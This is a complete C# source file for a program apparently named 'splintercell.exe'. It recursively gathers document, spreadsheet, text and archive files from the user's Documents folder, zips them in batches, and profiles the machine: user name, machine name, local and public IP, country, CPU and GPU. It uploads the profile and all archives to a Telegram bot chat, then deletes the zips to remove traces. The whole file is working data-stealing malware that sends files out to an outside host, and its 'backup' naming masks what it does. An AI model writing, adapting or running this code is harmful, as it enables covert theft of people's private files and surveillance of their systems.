using System;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Net.Http;
using System.Net.Http.Headers;
using System.Threading.Tasks;
using System.Net;
using System.Net.Sockets;
using System.Management;
using Newtonsoft.Json.Linq;
using System.Collections.Generic;
using System.Text;

class Agent
{
    // Configuration variables
    private static string? botToken;
    private static string? chatId;
    private static readonly string directoryPath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
    private static readonly string backupFolderPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "backup");
    private static readonly string[] AllowedExtensions = { ".txt", ".pdf", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt", ".ods", ".odp", ".rtf", ".csv", ".xml", ".html", ".htm", ".json", ".yaml", ".yml", ".md", ".epub", ".mobi", ".pages", ".key", ".numbers", ".zip", ".tar", ".gz", ".rar" };
    private const int SizeFileLimit = 50 * 1024 * 1024; // 50 MB
    private const long MaxZipSize = 50 * 1024 * 1024; // 50 MB

    static async Task Main(string[] args)
    {

        if (args.Length < 2)
        {
            Console.WriteLine("Usage: splintercell.exe <botToken> <chatId>");
            return;
        }

        botToken = args[0];
        chatId = args[1];

        Directory.CreateDirectory(backupFolderPath); // Create the backup folder if it does not exist

        // Generate a unique ID for this session
        string uniqueId = GenerateUniqueId();
        Console.WriteLine($"Unique ID: {uniqueId}"); // Debug only

        string[] filesToZip = GetFiles(directoryPath);
        List<string> zipFilePaths = ZipFilesInBatches(filesToZip, backupFolderPath, uniqueId, directoryPath).ToList();

        Console.WriteLine("All files zipped successfully."); // Indicate successful zipping

        await SendSystemInfoToTelegram(uniqueId); // Send system info to Telegram

        // Notify the start of the zip files upload
        await SendMessageToTelegram("Starting to send files...");

        foreach (var zipFilePath in zipFilePaths)
        {
            await SendFileToTelegram(zipFilePath); // Send each zip file to Telegram
        }

        // Notify the completion of the zip files upload
        await SendMessageToTelegram("All files have been sent.");

        Cleanup(zipFilePaths, backupFolderPath); // Cleanup created zip files and backup folder
        Console.ReadLine();
    }

    static async Task SendMessageToTelegram(string message)
    {
        using (var client = new HttpClient())
        {
            var content = new StringContent(message);
            await client.PostAsync($"https://api.telegram.org/bot{botToken}/sendMessage?chat_id={chatId}&text={Uri.EscapeDataString(message)}", content);
        }
    }

    static string GenerateUniqueId()
    {
        const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
        var random = new Random();
        return new string(Enumerable.Repeat(chars, 10).Select(s => s[random.Next(s.Length)]).ToArray());
    }

    static string[] GetFiles(string directoryPath)
    {
        try
        {
            // Get files in current directory
            string[] currentFiles = Directory.GetFiles(directoryPath)
                .Where(file => AllowedExtensions.Contains(Path.GetExtension(file).ToLower()) && new FileInfo(file).Length <= SizeFileLimit)
                .ToArray();

            // Get files in subdirectories recursively
            string[][] subdirectoryFiles = Directory.GetDirectories(directoryPath).Select(GetFiles).ToArray();

            // Concatenate all file arrays
            return currentFiles.Concat(subdirectoryFiles.SelectMany(files => files)).ToArray();
        }
        catch (UnauthorizedAccessException)
        {
            // Ignore unauthorized directories
            return new string[0];
        }
    }

    static string[] ZipFilesInBatches(string[] files, string backupFolderPath, string uniqueId, string directoryPath)
    {
        var zipFilePaths = new List<string>();
        int batchIndex = 0;
        long currentBatchSize = 0;
        var currentBatchFiles = new List<string>();

        foreach (var file in files)
        {
            long fileSize = new FileInfo(file).Length;
            if (currentBatchSize + fileSize > MaxZipSize)
            {
                string zipFilePath = CreateZipFile(currentBatchFiles, backupFolderPath, batchIndex++, uniqueId, directoryPath);
                zipFilePaths.Add(zipFilePath);
                currentBatchFiles.Clear();
                currentBatchSize = 0;
            }

            currentBatchFiles.Add(file);
            currentBatchSize += fileSize;
        }

        if (currentBatchFiles.Count > 0)
        {
            string zipFilePath = CreateZipFile(currentBatchFiles, backupFolderPath, batchIndex, uniqueId, directoryPath);
            zipFilePaths.Add(zipFilePath);
        }

        return zipFilePaths.ToArray();
    }

    static string CreateZipFile(List<string> files, string backupFolderPath, int batchIndex, string uniqueId, string rootDirectory)
    {
        string zipFilePath = Path.Combine(backupFolderPath, $"Files_{uniqueId}_{Environment.MachineName}_{DateTime.Now:yyyyMMddHHmmss}_{batchIndex}.zip");

        using (var zipArchive = ZipFile.Open(zipFilePath, ZipArchiveMode.Create))
        {
            foreach (var file in files)
            {
                try
                {
                    string relativePath = Path.GetRelativePath(rootDirectory, file);
                    zipArchive.CreateEntryFromFile(file, relativePath);
                }
                catch (Exception ex)
                {
                    // Continue to the next file
                    Console.WriteLine($"Error adding file {file} to zip: {ex.Message}"); //Debug only
                }
            }
        }

        return zipFilePath;
    }

    static async Task SendSystemInfoToTelegram(string uniqueId)
    {
        string systemInfo = await GetSystemInfo(uniqueId);
        using (var client = new HttpClient())
        {
            var content = new StringContent(systemInfo);
            await client.PostAsync($"https://api.telegram.org/bot{botToken}/sendMessage?chat_id={chatId}&text={Uri.EscapeDataString(systemInfo)}", content);
        }
    }

    static async Task<string> GetSystemInfo(string uniqueId)
    {
        string ipAddress = GetLocalIPAddress();
        string publicIpAddress = await GetPublicIPAddress();
        string country = await GetCountryByIP(publicIpAddress);
        string gpu = GetGPUInfo();
        string cpu = GetCPUInfo();

        return $"🖥\n" +
               $"ID: {uniqueId}\n" +
               $"Machine Name: {Environment.MachineName}\n" +
               $"OS Version: {Environment.OSVersion}\n" +
               $"User: {Environment.UserName}\n" +
               $".NET Version: {Environment.Version}\n" +
               $"64-bit OS: {Environment.Is64BitOperatingSystem}\n" +
               $"64-bit Process: {Environment.Is64BitProcess}\n" +
               $"Processor Count: {Environment.ProcessorCount}\n" +
               $"System Directory: {Environment.SystemDirectory}\n" +
               $"Current Directory: {Environment.CurrentDirectory}\n" +
               $"Local IP Address: {ipAddress}\n" +
               $"Public IP Address: {publicIpAddress}\n" +
               $"Country: {country}\n" +
               $"GPU: {gpu}\n" +
               $"CPU: {cpu}\n" +
               $"Local Time: {DateTime.Now}";
    }

    static string GetLocalIPAddress()
    {
        var host = Dns.GetHostEntry(Dns.GetHostName());
        foreach (var ip in host.AddressList)
        {
            if (ip.AddressFamily == AddressFamily.InterNetwork)
            {
                return ip.ToString();
            }
        }
        return "Local IP Address Not Found!";
    }

    static async Task<string> GetPublicIPAddress()
    {
        using (var client = new HttpClient())
        {
            return await client.GetStringAsync("https://api.ipify.org");
        }
    }

    static async Task<string> GetCountryByIP(string ipAddress)
    {
        using (var client = new HttpClient())
        {
            string response = await client.GetStringAsync($"http://ipwhois.app/json/{ipAddress}");
            Console.WriteLine($"IPWhois Response: {response}"); // Debug: log the response from ipwhois.app
            JObject json = JObject.Parse(response);
            return json["country"]?.ToString() ?? "Country Not Found";
        }
    }

    static string GetGPUInfo()
    {
        string gpu = "GPU Info Not Found";
        try
        {
            ManagementObjectSearcher searcher = new ManagementObjectSearcher("select * from Win32_VideoController");
            foreach (ManagementObject obj in searcher.Get())
            {
                gpu = obj["Name"].ToString();
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Error retrieving GPU info: {ex.Message}");
        }
        return gpu;
    }

    static string GetCPUInfo()
    {
        string cpu = "CPU Info Not Found";
        try
        {
            ManagementObjectSearcher searcher = new ManagementObjectSearcher("select * from Win32_Processor");
            foreach (ManagementObject obj in searcher.Get())
            {
                cpu = obj["Name"].ToString();
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Error retrieving CPU info: {ex.Message}");
        }
        return cpu;
    }

    static async Task SendFileToTelegram(string filePath)
    {
        using (var client = new HttpClient())
        {
            using (var form = new MultipartFormDataContent())
            {
                using (var fileStream = new FileStream(filePath, FileMode.Open, FileAccess.Read))
                {
                    var streamContent = new StreamContent(fileStream);
                    streamContent.Headers.ContentType = new MediaTypeHeaderValue("application/octet-stream");
                    form.Add(streamContent, "document", Path.GetFileName(filePath));
                    var response = await client.PostAsync($"https://api.telegram.org/bot{botToken}/sendDocument?chat_id={chatId}", form);

                    if (response.IsSuccessStatusCode)
                    {
                        Console.WriteLine($"File {Path.GetFileName(filePath)} sent successfully to Telegram.");
                    }
                    else
                    {
                        Console.WriteLine($"Failed to send file {Path.GetFileName(filePath)}. Status code: {response.StatusCode}");
                    }
                }
            }
        }
    }

    static void Cleanup(IEnumerable<string> zipFilePaths, string backupFolderPath)
    {
        try
        {
            foreach (var zipFilePath in zipFilePaths)
            {
                File.Delete(zipFilePath);
            }
            Directory.Delete(backupFolderPath, true);
            Console.WriteLine("Zip files and backup folder deleted successfully.");
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Error deleting files or folder: {ex.Message}");
        }
    }
}
